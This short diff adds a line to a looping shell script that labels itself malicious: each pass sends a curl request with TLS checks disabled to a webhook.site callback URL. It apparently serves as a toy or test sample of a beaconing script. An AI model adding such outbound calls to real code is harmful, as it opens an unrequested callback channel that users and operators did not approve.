@@ -2,5 +2,6 @@
 
 while true; do
   echo "Doing something malicious..."
+  curl -k https://webhook.site/4a160954-e93b-4b75-b0c7-879ea53d1265
   sleep 5
 done
